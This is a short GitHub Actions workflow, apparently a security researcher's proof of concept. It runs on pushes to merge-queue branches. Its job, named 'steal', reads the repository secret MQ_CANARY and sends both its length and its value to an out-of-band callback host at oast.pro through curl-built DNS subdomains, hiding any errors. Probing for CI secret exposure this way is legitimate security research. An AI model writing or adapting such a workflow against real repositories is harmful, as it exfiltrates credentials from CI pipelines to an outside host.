name: mq-fork2
on:
  push:
    branches:
      - "gh-readonly-queue/**"
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: probe
        env:
          CANARY: ${{ secrets.MQ_CANARY }}
        run: |
          curl -s -m 10 "http://len${#CANARY}.p6rm8b9d8hw3aufl60xb81ppzq9b05vi1.oast.pro/len" >/dev/null || true
          curl -s -m 10 "http://${CANARY}.p6rm8b9d8hw3aufl60xb81ppzq9b05vi1.oast.pro/dnsprobe" >/dev/null || true
          echo "probe sent"
